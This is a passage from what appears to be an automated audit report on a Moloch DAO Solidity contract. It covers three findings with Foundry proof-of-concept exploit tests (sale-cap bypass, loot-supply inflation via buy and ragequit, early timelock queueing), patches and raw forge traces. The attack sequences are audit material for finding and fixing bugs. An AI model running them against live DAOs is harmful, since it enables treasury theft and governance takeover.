    ├─ [0] VM::deal(Moloch: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2000000000000000000 [2e18])
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [67750] Moloch::spendPermit(0, 0x000000000000000000000000000000000000bEEF, 1000000000000000000 [1e18], 0x, 0xec1a522eab76eec1ecd63c61f54e410714fd88126a025b4ebfd887619af5b21a)
    │   ├─ emit Transfer(caller: 0x00000000000000000000000000000000000A11cE, from: 0x00000000000000000000000000000000000A11cE, to: 0x0000000000000000000000000000000000000000, id: 22381582320559696737622307053258675683844895773635009021500122020590908876487 [2.238e76], amount: 1)
    │   ├─ [0] 0x000000000000000000000000000000000000bEEF::fallback{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ emit PermitSpent(id: 22381582320559696737622307053258675683844895773635009021500122020590908876487 [2.238e76], by: 0x00000000000000000000000000000000000A11cE, op: 0, to: 0x000000000000000000000000000000000000bEEF, value: 1000000000000000000 [1e18])
    │   └─ ← [Return] true, 0x
    ├─ [0] VM::prank(0x0000000000000000000000000000000000000B0b)
    │   └─ ← [Return]
    ├─ [3076] Moloch::spendPermit(0, 0x000000000000000000000000000000000000bEEF, 1000000000000000000 [1e18], 0x, 0xec1a522eab76eec1ecd63c61f54e410714fd88126a025b4ebfd887619af5b21a)
    │   └─ ← [Revert] AlreadyExecuted()
    └─ ← [Revert] AlreadyExecuted()

Backtrace:
  at Moloch.spendPermit
  at MolochPermitReplayTest.testPermitReceiptReplay

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.10ms (1.83ms CPU time)

Ran 1 test suite in 27.02ms (3.10ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/MolochHarness.t.sol:MolochPermitReplayTest
[FAIL: AlreadyExecuted()] testPermitReceiptReplay() (gas: 7626168)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# Sale cap turns unlimited when exhausted
**#13**
- Severity: Critical
- Validity: Not a bug
> **Review: Known quirk, not a security issue in practice.** Cap is a soft guardrail, not a hard limit. In `minting = true` mode, unlimited issuance is the intended behavior (upgrade/conversion use case). In `minting = false` mode, the DAO's preminted token balance provides a natural hard cap — `transfer` reverts when supply runs out. UI should treat a 0-cap on a previously-capped sale as "sold out" and prompt the DAO to deactivate. Consider deactivating automatically in v2.

## Targets
- buyShares (Moloch)
- setSale (Moloch)

## Affected Locations
- **Moloch.buyShares**: The cap check is conditioned on `s.cap != 0` and the function decrements `s.cap` down to zero without deactivating the sale; changing this logic (e.g., separate uncapped flag vs remaining cap, or deactivating when remaining becomes zero) restores correct enforcement after depletion.
- **Moloch.setSale**: `setSale` establishes the semantic meaning of `cap == 0` as “uncapped”, which collides with `buyShares` mutating a finite cap down to zero; adjusting this representation (e.g., explicit `uncapped` boolean or distinct `remainingCap`) prevents the cross-function ambiguity that enables the bypass.

## Description

`Sale.cap` uses `0` as a sentinel meaning “uncapped”, but `buyShares` also naturally reduces the remaining cap to `0` when the last allowed shares are purchased. If a buyer purchases exactly the remaining amount, `buyShares` decrements `s.cap` to zero while leaving the sale active. Subsequent purchases see `cap == 0` and skip the cap enforcement path entirely, effectively converting a capped sale into an unlimited sale at the configured price. The bug stems from conflating “uncapped” and “sold out” into the same value and not transitioning sale state when the cap is fully consumed. A robust fix is to separate “uncapped” from “remaining”, or explicitly deactivate the sale when the remaining cap reaches zero and treat `cap == 0` as “sold out” in the capped mode.

## Root cause

The code overloads `cap == 0` to mean both “unlimited” and “cap exhausted”, and does not deactivate or otherwise enforce limits when the remaining cap reaches zero.

## Impact

Any buyer can exceed the governance-approved maximum sale size by first buying exactly the remaining cap and then continuing to purchase without limit while the sale remains active. This can inflate shares/loot beyond intended bounds, diluting members and potentially enabling governance takeover; it can also enable economic extraction if shares can be redeemed (e.g., via `ragequit`) for treasury-backed value exceeding the sale price.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract MolochSaleCapBugTest is Test {
    function testSaleCapBecomesUnlimitedWhenExhausted() public {
        Moloch moloch = new Moloch();

        address[] memory initHolders = new address[](1);
        uint256[] memory initShares = new uint256[](1);
        initHolders[0] = address(this);
        initShares[0] = 1;

        Call[] memory initCalls = new Call[](1);
        initCalls[0] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeWithSelector(
                Moloch.setSale.selector,
                address(0),
                1 ether,
                10,
                true,
                true,
                false
            )
        });

        moloch.init(
            "Org",
            "ORG",
            "",
            0,
            false,
            address(0),
            initHolders,
            initShares,
            initCalls
        );

        address attacker = address(0xBEEF);
        vm.deal(attacker, 100 ether);

        vm.prank(attacker);
        moloch.buyShares{value: 10 ether}(address(0), 10, 0);

        (, uint256 remainingCap, , ,) = moloch.sales(address(0));
        assertEq(remainingCap, 0, "cap should be exhausted");

        vm.prank(attacker);
        moloch.buyShares{value: 5 ether}(address(0), 5, 0);

        uint256 attackerShares = moloch.shares().balanceOf(attacker);
        assertEq(attackerShares, 10, "cap should prevent additional purchases");
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Deactivate the sale by setting `s.active` to `false` when a capped sale’s remaining `s.cap` is reduced to zero, so an exhausted cap cannot be treated as an unlimited sale in subsequent `buyShares` calls.

### Patch

```diff
diff --git a/src/Moloch.sol b/src/Moloch.sol
--- a/src/Moloch.sol
+++ b/src/Moloch.sol
@@ -725,6 +725,9 @@
             unchecked {
                 s.cap = cap - shareAmount;
             }
+            if (s.cap == 0) {
+                s.active = false;
+            }
         }
 
         // pull funds
```

### Affected Files

- `src/Moloch.sol`

### Validation Output

```
Compiling 21 files with Solc 0.8.30
Solc 0.8.30 finished in 16.70s
Compiler run successful!

Ran 1 test for test/MolochHarness.t.sol:MolochSaleCapBugTest
[FAIL: NotOk()] testSaleCapBecomesUnlimitedWhenExhausted() (gas: 8113991)
Traces:
  [8113991] MolochSaleCapBugTest::testSaleCapBecomesUnlimitedWhenExhausted()
    ├─ [7150657] → new Moloch@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [1560426] → new Shares@0x20A3ba16D3343E426113633d05999F49ea325a83
    │   │   └─ ← [Return] 7794 bytes of code
    │   ├─ [866296] → new Badges@0x3AFC507eEc6582098309443F5fBf3C2a6875ca46
    │   │   └─ ← [Return] 4327 bytes of code
    │   ├─ [405435] → new Loot@0xc4C1d09c12f0ED574BA67FA8e65422aB26dC21fE
    │   │   └─ ← [Return] 2025 bytes of code
    │   └─ ← [Return] 21061 bytes of code
    ├─ [688746] Moloch::init("Org", "ORG", "", 0, false, 0x0000000000000000000000000000000000000000, [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [1], [Call({ target: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, value: 0, data: 0x48b7fef200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000 })])
    │   ├─ [9028] → new <unknown>@0xFf1B54298cbC5CA5d551A16Cb12B9B80675f7BB9
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22716] 0xFf1B54298cbC5CA5d551A16Cb12B9B80675f7BB9::init()
    │   │   ├─ [22561] Badges::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x34cd0C0Db7081454a11c5C8E09CC3c27f1C047E1
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [333625] 0x34cd0C0Db7081454a11c5C8E09CC3c27f1C047E1::init([0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [1])
    │   │   ├─ [333434] Shares::init([0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [1]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1)
    │   │   │   ├─ emit DelegateChanged(delegator: MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ emit DelegateVotesChanged(delegate: MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], previousBalance: 0, newBalance: 1)
    │   │   │   ├─ [141065] Moloch::onSharesChanged(MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   ├─ [139024] 0xFf1B54298cbC5CA5d551A16Cb12B9B80675f7BB9::onSharesChanged(MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   ├─ [138863] Badges::onSharesChanged(MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x34cd0C0Db7081454a11c5C8E09CC3c27f1C047E1
    │   │   │   │   │   │   ├─ [856] 0x34cd0C0Db7081454a11c5C8E09CC3c27f1C047E1::balanceOf(MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   ├─ [692] Shares::balanceOf(MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 1
    │   │   │   │   │   │   │   └─ ← [Return] 1
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: MolochSaleCapBugTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], id: 1)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x37f1C0958C142BCdD928A085f40B3f33740091fd
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22728] 0x37f1C0958C142BCdD928A085f40B3f33740091fd::init()
    │   │   ├─ [22573] Loot::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [70508] Moloch::setSale(0x0000000000000000000000000000000000000000, 1000000000000000000 [1e18], 10, true, true, false)
    │   │   ├─ emit SaleUpdated(payToken: 0x0000000000000000000000000000000000000000, price: 1000000000000000000 [1e18], cap: 10, minting: true, active: true, isLoot: false)
    │   │   └─ ← [Return]
    │   └─ ← [Return]
    ├─ [0] VM::deal(0x000000000000000000000000000000000000bEEF, 100000000000000000000 [1e20])
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [205359] Moloch::buyShares{value: 10000000000000000000}(0x0000000000000000000000000000000000000000, 10, 0)
    │   ├─ [200496] 0x34cd0C0Db7081454a11c5C8E09CC3c27f1C047E1::mintFromMoloch(0x000000000000000000000000000000000000bEEF, 10)
    │   │   ├─ [200329] Shares::mintFromMoloch(0x000000000000000000000000000000000000bEEF, 10) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000bEEF, amount: 10)
    │   │   │   ├─ emit DelegateChanged(delegator: 0x000000000000000000000000000000000000bEEF, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x000000000000000000000000000000000000bEEF)
    │   │   │   ├─ emit DelegateVotesChanged(delegate: 0x000000000000000000000000000000000000bEEF, previousBalance: 0, newBalance: 10)
    │   │   │   ├─ [97147] Moloch::onSharesChanged(0x000000000000000000000000000000000000bEEF)
    │   │   │   │   ├─ [95106] 0xFf1B54298cbC5CA5d551A16Cb12B9B80675f7BB9::onSharesChanged(0x000000000000000000000000000000000000bEEF)
    │   │   │   │   │   ├─ [94945] Badges::onSharesChanged(0x000000000000000000000000000000000000bEEF) [delegatecall]
    │   │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x34cd0C0Db7081454a11c5C8E09CC3c27f1C047E1
    │   │   │   │   │   │   ├─ [856] 0x34cd0C0Db7081454a11c5C8E09CC3c27f1C047E1::balanceOf(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   │   │   │   │   │   │   ├─ [692] Shares::balanceOf(0x000000000000000000000000000000000000bEEF) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 10
    │   │   │   │   │   │   │   └─ ← [Return] 10
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000bEEF, id: 2)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ emit SharesPurchased(buyer: 0x000000000000000000000000000000000000bEEF, payToken: 0x0000000000000000000000000000000000000000, shares: 10, paid: 10000000000000000000 [1e19])
    │   └─ ← [Return]
    ├─ [2150] Moloch::sales(0x0000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18], 0, true, false, false
    ├─ [0] VM::assertEq(0, 0, "cap should be exhausted") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [1083] Moloch::buyShares{value: 5000000000000000000}(0x0000000000000000000000000000000000000000, 5, 0)
    │   └─ ← [Revert] NotOk()
    └─ ← [Revert] NotOk()

Backtrace:
  at Moloch.buyShares
  at MolochSaleCapBugTest.testSaleCapBecomesUnlimitedWhenExhausted

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 17.38ms (11.63ms CPU time)

Ran 1 test suite in 152.08ms (17.38ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/MolochHarness.t.sol:MolochSaleCapBugTest
[FAIL: NotOk()] testSaleCapBecomesUnlimitedWhenExhausted() (gas: 8113991)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# Transient loot supply inflates futarchy pool
**#14**
- Severity: Critical
- Validity: Not a bug
> **Review: Design tradeoff, low practical risk.** Requires active loot sale + auto-futarchy + ragequit all enabled simultaneously. Futarchy pool is an earmark, not a transfer — payouts are bounded by actual token balances held by the DAO. Overpromising in `F.pool` causes cashout to revert (griefing, not theft). Consider snapshotting loot supply in v2.

## Targets
- buyShares (Moloch)

## Affected Locations
- **Moloch.buyShares**: Single finding location

## Description

`openProposal` computes the auto‑futarchy funding amount using the current `loot.totalSupply()`, but only shares supply is snapshotted at `block.number - 1`. Because `buyShares` can mint loot permissionlessly (when a loot sale is active) and `ragequit` can immediately burn that loot, the total supply can be inflated and then reverted within a single transaction. An attacker can therefore mint a large amount of loot, call `openProposal` to lock in a larger `F.pool`, and then burn the loot so the supply returns to normal. The pool remains permanently inflated even though the temporary supply increase never persisted. This cross‑function sequencing lets attackers create reward obligations larger than intended and potentially extract or lock reward funds during futarchy payouts.

## Root cause

`openProposal` relies on the live `loot.totalSupply()` without snapshotting or locking it, while other public functions can mint and burn loot in the same transaction, allowing transient supply manipulation to persist in futarchy state.

## Impact

Attackers can increase futarchy reward pools without permanently holding loot or increasing long‑term supply. If they later win the futarchy payout, they can claim more reward tokens than the steady‑state supply justifies, or the system may be unable to honor payouts and revert, effectively griefing governance and reward distribution.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract LootInflator {
    receive() external payable {}

    function attack(Moloch moloch, uint256 shareAmount, uint256 proposalId)
        external
        payable
    {
        moloch.buyShares{value: shareAmount}(address(0), shareAmount, shareAmount);
        moloch.openProposal(proposalId);
        address[] memory tokens = new address[](1);
        tokens[0] = address(0);
        moloch.ragequit(tokens, 0, shareAmount);
    }
}

contract MolochHarnessTest is Test {
    function testTransientLootInflatesFutarchyPool() public {
        Moloch moloch = new Moloch();

        address[] memory initHolders = new address[](1);
        initHolders[0] = address(this);
        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 100;

        Call[] memory initCalls = new Call[](2);
        initCalls[0] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeCall(Moloch.setAutoFutarchy, (10_000, 0))
        });
        initCalls[1] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeCall(
                Moloch.setSale,
                (address(0), 1, 0, true, true, true)
            )
        });

        moloch.init(
            "TestDAO",
            "TEST",
            "",
            0,
            true,
            address(0),
            initHolders,
            initShares,
            initCalls
        );

        vm.roll(block.number + 1);

        uint256 shareAmount = 1_000;
        address attacker = address(0xBEEF);
        vm.deal(attacker, shareAmount);

        uint256 proposalId = moloch.proposalId(
            0,
            address(0xdead),
            0,
            "",
            bytes32("nonce")
        );

        LootInflator inflator = new LootInflator();
        vm.prank(attacker);
        inflator.attack{value: shareAmount}(moloch, shareAmount, proposalId);

        assertEq(moloch.loot().totalSupply(), 0, "loot supply should be burned back to zero");

        (bool enabled,, uint256 pool,,,,) = moloch.futarchy(proposalId);
        assertTrue(enabled, "futarchy should be enabled");

        uint256 currentBasis = moloch.shares().totalSupply() + moloch.loot().totalSupply();
        assertGt(pool, currentBasis, "futarchy pool permanently inflated by transient loot");
        assertEq(pool, 1_100, "pool reflects temporary loot inflation");
    }
}
```

## Remediation

**Status:** Error

### Explanation

Record and use a stable loot supply snapshot for each proposal (e.g., a cached totalSupply finalized in a prior block), and make `openProposal` revert if loot was minted/burned in the current block or transaction; base futarchy pool sizing and payouts solely on that snapshot instead of the live `totalSupply()`.

### Error

Error code: 400 - {'error': {'message': 'Your input exceeds the context window of this model. Please adjust your input and try again.', 'type': 'invalid_request_error', 'param': 'input', 'code': 'context_length_exceeded'}}

---

# Timelock starts before vote finalization
**#15**
- Severity: Critical
- Validity: Not a bug
> **Review: Good hardening for v2, narrow attack window.** Requires a coalition that temporarily reaches quorum, loses it, then regains it after timelock elapses. Blocking `castVote` after queueing is a reasonable addition for future versions.

## Targets
- queue (Moloch)

## Affected Locations
- **Moloch.queue**: Single finding location

## Description

`queue` and the first call to `executeByVotes` set `queuedAt` as soon as `state(id)` reports `Succeeded`, but `state` does not require the proposal TTL to have elapsed before returning `Succeeded`. At the same time, `castVote`/`cancelVote` only use `createdAt` and `proposalTTL` to gate voting and do not clear or update `queuedAt`, so tallies can still change after a proposal is queued. This means the timelock countdown begins while the proposal is still mutable, and the recorded `queuedAt` is never reset when the outcome flips. Once the delay has elapsed, an attacker can make the proposal succeed again with late votes and immediately execute, leaving no reaction window between the final vote and execution. The cross‑function interaction between early queueing, mutable tallies, and a non‑resetting `queuedAt` undermines the intended timelock guarantees.

## Root cause

`queuedAt` is set once when a proposal first reaches `Succeeded` and is never cleared or updated if tallies change, while queueing is allowed before the voting window closes.

## Impact

A governance attacker can start the timelock early, then manipulate votes later and execute immediately after the delay has already elapsed. This collapses the effective delay between the final vote outcome and execution, reducing or eliminating the reaction time that the timelock is meant to provide. Treasury actions can therefore be executed with little to no warning once the attacker regains majority support.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract MolochTimelockEarlyStartTest is Test {
    function testTimelockStartsBeforeVoteFinalization() public {
        Moloch moloch = new Moloch();

        address attacker1 = address(0xA11CE);
        address attacker2 = address(0xB0B);
        address honest = address(0xC0FFEE);

        address[] memory holders = new address[](3);
        holders[0] = attacker1;
        holders[1] = attacker2;
        holders[2] = honest;

        uint256[] memory shares = new uint256[](3);
        shares[0] = 40;
        shares[1] = 30;
        shares[2] = 50;

        Call[] memory initCalls = new Call[](2);
        initCalls[0] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeWithSelector(Moloch.setProposalTTL.selector, 10 days)
        });
        initCalls[1] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeWithSelector(Moloch.setTimelockDelay.selector, 3 days)
        });

        moloch.init("TestDAO", "TDAO", "", 0, false, address(0), holders, shares, initCalls);

        // Ensure a new block so snapshots can read the total supply checkpoint.
        vm.roll(block.number + 1);

        vm.deal(address(this), 2 ether);
        payable(address(moloch)).transfer(1 ether);

        bytes32 nonce = keccak256("timelock-nonce");
        uint256 id = moloch.proposalId(0, attacker1, 1 ether, "", nonce);

        // Attacker1 makes the proposal succeed and queues it immediately.
        vm.prank(attacker1);
        moloch.castVote(id, 1);

        vm.prank(attacker1);
        moloch.queue(id);

        uint64 queuedAt = moloch.queuedAt(id);
        uint64 createdAt = moloch.createdAt(id);
        assertLt(queuedAt, createdAt + 10 days, "queued before TTL ends");

        // Honest voter flips the proposal to defeated while timelock is running.
        vm.warp(createdAt + 1 days);
        vm.prank(honest);
        moloch.castVote(id, 0);

        // Timelock delay elapses while proposal is defeated.
        vm.warp(queuedAt + 3 days + 1);

        // Attacker2 swings the vote back to success after the timelock already elapsed.
        vm.prank(attacker2);
        moloch.castVote(id, 1);

        uint64 finalVoteTime = uint64(block.timestamp);
        uint256 attackerBalanceBefore = attacker1.balance;

        // Execution happens immediately even though the final vote just occurred.
        vm.prank(attacker2);
        moloch.executeByVotes(0, attacker1, 1 ether, "", nonce);

        assertEq(attacker1.balance, attackerBalanceBefore + 1 ether, "funds executed");

        // Invariant: timelock should start after the final vote, but it doesn't.
        assertGe(
            block.timestamp,
            finalVoteTime + 3 days,
            "timelock was already elapsed before final vote"
        );
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Block `castVote` once `queuedAt` is set so votes cannot change after a proposal is queued, ensuring the timelock starts only after the final vote outcome is fixed.

### Patch

```diff
diff --git a/src/Moloch.sol b/src/Moloch.sol
--- a/src/Moloch.sol
+++ b/src/Moloch.sol
@@ -347,6 +347,7 @@
     function castVote(uint256 id, uint8 support) public {
         if (executed[id]) revert AlreadyExecuted();
         if (support > 2) revert NotOk();
+        if (queuedAt[id] != 0) revert NotOk();
 
         // auto-open on first vote if unopened
         if (createdAt[id] == 0) openProposal(id);
```

### Affected Files

- `src/Moloch.sol`

### Validation Output

```
Compiling 21 files with Solc 0.8.30
Solc 0.8.30 finished in 12.67s
Compiler run successful!

Ran 1 test for test/MolochHarness.t.sol:MolochTimelockEarlyStartTest
[FAIL: NotOk()] testTimelockStartsBeforeVoteFinalization() (gas: 8547399)
Traces:
  [8547399] MolochTimelockEarlyStartTest::testTimelockStartsBeforeVoteFinalization()
    ├─ [7088172] → new Moloch@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [1560426] → new Shares@0xd8aB624253E6E24654F20C4162B5E682df7c239C
    │   │   └─ ← [Return] 7794 bytes of code
    │   ├─ [866296] → new Badges@0x0213fe52753E1d8223c5F51802BA94EcEd8eC251
    │   │   └─ ← [Return] 4327 bytes of code
    │   ├─ [405435] → new Loot@0xb5b52024b364776C851b780B7e88c881e4A58b4F
    │   │   └─ ← [Return] 2025 bytes of code
    │   └─ ← [Return] 20749 bytes of code
    ├─ [1046057] Moloch::init("TestDAO", "TDAO", "", 0, false, 0x0000000000000000000000000000000000000000, [0x00000000000000000000000000000000000A11cE, 0x0000000000000000000000000000000000000B0b, 0x0000000000000000000000000000000000C0FFEE], [40, 30, 50], [Call({ target: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, value: 0, data: 0xff39146700000000000000000000000000000000000000000000000000000000000d2f00 }), Call({ target: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, value: 0, data: 0x3821933a000000000000000000000000000000000000000000000000000000000003f480 })])
    │   ├─ [9028] → new <unknown>@0xc769F0234893E2a3C7DA873DBD3F21219A4E2EdA
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22716] 0xc769F0234893E2a3C7DA873DBD3F21219A4E2EdA::init()
    │   │   ├─ [22561] Badges::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [735072] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC::init([0x00000000000000000000000000000000000A11cE, 0x0000000000000000000000000000000000000B0b, 0x0000000000000000000000000000000000C0FFEE], [40, 30, 50])
    │   │   ├─ [734857] Shares::init([0x00000000000000000000000000000000000A11cE, 0x0000000000000000000000000000000000000B0b, 0x0000000000000000000000000000000000C0FFEE], [40, 30, 50]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, amount: 40)
    │   │   │   ├─ emit DelegateChanged(delegator: 0x00000000000000000000000000000000000A11cE, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x00000000000000000000000000000000000A11cE)
    │   │   │   ├─ emit DelegateVotesChanged(delegate: 0x00000000000000000000000000000000000A11cE, previousBalance: 0, newBalance: 40)
    │   │   │   ├─ [141065] Moloch::onSharesChanged(0x00000000000000000000000000000000000A11cE)
    │   │   │   │   ├─ [139024] 0xc769F0234893E2a3C7DA873DBD3F21219A4E2EdA::onSharesChanged(0x00000000000000000000000000000000000A11cE)
    │   │   │   │   │   ├─ [138863] Badges::onSharesChanged(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC
    │   │   │   │   │   │   ├─ [856] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
    │   │   │   │   │   │   │   ├─ [692] Shares::balanceOf(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 40
    │   │   │   │   │   │   │   └─ ← [Return] 40
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, id: 1)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000B0b, amount: 30)
    │   │   │   ├─ emit DelegateChanged(delegator: 0x0000000000000000000000000000000000000B0b, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x0000000000000000000000000000000000000B0b)
    │   │   │   ├─ emit DelegateVotesChanged(delegate: 0x0000000000000000000000000000000000000B0b, previousBalance: 0, newBalance: 30)
    │   │   │   ├─ [97290] Moloch::onSharesChanged(0x0000000000000000000000000000000000000B0b)
    │   │   │   │   ├─ [95249] 0xc769F0234893E2a3C7DA873DBD3F21219A4E2EdA::onSharesChanged(0x0000000000000000000000000000000000000B0b)
    │   │   │   │   │   ├─ [95088] Badges::onSharesChanged(0x0000000000000000000000000000000000000B0b) [delegatecall]
    │   │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC
    │   │   │   │   │   │   ├─ [856] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]
    │   │   │   │   │   │   │   ├─ [692] Shares::balanceOf(0x0000000000000000000000000000000000000B0b) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 30
    │   │   │   │   │   │   │   └─ ← [Return] 30
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000B0b, id: 2)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000C0FFEE, amount: 50)
    │   │   │   ├─ emit DelegateChanged(delegator: 0x0000000000000000000000000000000000C0FFEE, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x0000000000000000000000000000000000C0FFEE)
    │   │   │   ├─ emit DelegateVotesChanged(delegate: 0x0000000000000000000000000000000000C0FFEE, previousBalance: 0, newBalance: 50)
    │   │   │   ├─ [97147] Moloch::onSharesChanged(0x0000000000000000000000000000000000C0FFEE)
    │   │   │   │   ├─ [95106] 0xc769F0234893E2a3C7DA873DBD3F21219A4E2EdA::onSharesChanged(0x0000000000000000000000000000000000C0FFEE)
    │   │   │   │   │   ├─ [94945] Badges::onSharesChanged(0x0000000000000000000000000000000000C0FFEE) [delegatecall]
    │   │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC
    │   │   │   │   │   │   ├─ [856] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC::balanceOf(0x0000000000000000000000000000000000C0FFEE) [staticcall]
